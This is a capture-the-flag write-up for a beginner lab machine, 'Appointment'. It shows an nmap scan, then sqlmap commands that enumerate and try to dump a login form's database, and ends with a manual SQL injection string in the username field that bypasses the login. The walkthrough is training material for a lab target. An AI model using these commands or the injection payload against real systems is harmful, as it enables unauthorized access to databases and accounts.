# Appointment

## Abstract
*Category* : **Starting Point**<br/>
*Challenge name* : **Appointment**<br/>
*Host* : `10.129.85.215 `<br/>
*Description* : N/A <br/>
*Status* : **SOLVED**

## Walktrough
This is a simple *starting point* challenge.
<br/>
Since this is a machine, let's start with a classic `nmap` scan:
<br/>

```console
nmap -A -T5 10.129.85.215 
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-04 16:52 UTC
Nmap scan report for 10.129.85.215  (10.129.85.215 )
Host is up (0.046s latency).

|_http-title: Login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

As we can see, port 80 (http) is open, maybe we will find a website, let's go check! üîç
<br/>
We were right, it is a login page:<br/>

Since the questions on the challenge page refer to *sql injection*, we immediately launch sql map against the login form:
<br/>

```console
sqlmap -u http://10.129.85.215 / --data="username=user&password=pwd" --method POST --dbs --batch      ‚îÄ‚ïØ

```

The injection is successful and sqlmap enumerates 2 dbs:
<br/>
```console
appdb
information_schema
```

Let's retrieve the tables of the `appdb` database:
<br/>

```console
sqlmap -u http://10.129.85.215 / --data="username=user&password=pwd" --method POST --tables -D appdb

Database: appdb
[1 table]
+-------+
| users |
+-------+

```
Interesting, let's dump the `users` table:
<br/>

```console
sqlmap -u http://10.129.85.215 / --data="username=user&password=pwd" --method POST --dump -D appdb -T users


```
Unfortunately sqlmap dump in this case seems too instable and fails multiple times üòî
<br/>

the reason seems to be that the colum `pass` of the `users` table contains strange characters:
<br/>
```console
[17:53:13] [ERROR] invalid character detected. retrying..
```
<br/>
Let's try manually with some sqli payloads, directly from the login page...
<br/>
<br/>

The string `admin' or '1'='1` seems to work! (pass this in the `username` field)
<br/>
And boom! üí•üí•üí•
<br/>
 We have our flag! üè¥
